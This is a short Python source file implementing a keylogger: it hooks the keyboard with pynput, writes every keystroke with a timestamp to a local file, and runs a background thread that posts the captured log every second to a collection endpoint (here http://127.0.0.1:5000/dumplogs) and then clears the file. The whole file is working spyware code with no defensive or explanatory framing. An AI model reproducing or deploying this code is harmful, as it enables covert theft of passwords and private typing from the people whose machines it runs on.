import datetime
import threading
import time
from collections import deque
import requests
import pynput

class KeyLogger:
    key_que: deque = deque()

    def __init__(self):
        self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release, daemon=True)
        self.key_que.clear()
        self.listener.start()
        threading.Thread(target=self.sync_logs).start()

    def on_press(self, key):
        self.key_que.append(key)

    def on_release(self, key):
        key_string = " + ".join(list(map(KeyLogger.get_str, self.key_que))).strip()
        if key_string:
            with open("key_logs.txt", "a+") as file:
                file.write(str(datetime.datetime.now().timestamp()) + " :: " + key_string + "\n")
            print(key_string)
        self.key_que.clear()

    @staticmethod
    def get_str(key):
        return str(key)

    def sync_logs(self):
        while self.listener.is_alive():
            try:
                with open("key_logs.txt", "a+") as logs:
                    logs.seek(0)
                    data = logs.read().strip()
                    if data:
                        res = requests.post("http://127.0.0.1:5000/dumplogs", data=data.encode("utf-8"))
                        if res.status_code == 200:
                            new_data = logs.read()
                            logs.truncate(0)
                            logs.write(new_data)
            except requests.ConnectionError:
                print("COULDN'T CONNECT")
            except IOError:
                print("IO ERROR OCCURRED")

            time.sleep(1)

    def __del__(self):
        self.listener.stop()


